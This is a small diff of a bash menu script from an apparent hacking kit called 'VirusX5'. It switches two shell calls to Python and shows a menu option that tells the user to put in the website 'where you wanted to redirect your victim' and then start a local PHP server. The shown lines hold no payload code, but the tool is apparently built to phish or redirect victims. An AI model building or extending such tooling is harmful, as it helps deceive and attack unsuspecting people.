@@ -38,8 +38,8 @@ echo
 echo -e "$grn                  Auto Setup is Under Development May be Not Work properly $end"
 sleep 5.7
 clear
-cd $HOME/VirusX5/main
-bash host.sh
+# cd $HOME/VirusX5/main
+python3 host.py
 elif [[ $option == 2 || $option == 02 ]]; then
 echo -e "$grn READ THE FOLLOWING STEPS $end"
 echo -e "$grn I highlighted the code where you replace my Website name to your website link where you wanted to redirect your victim $end"
@@ -53,7 +53,7 @@ php -S localhost:8080
 elif [[ $option == 3 || $option == 03 ]]; then
 cd $HOME/VirusX5/main
 chmod +x *
-bash update.sh
+python3 update.py
 
 
 elif [[ $option == 4 || $option == 04 ]]; then
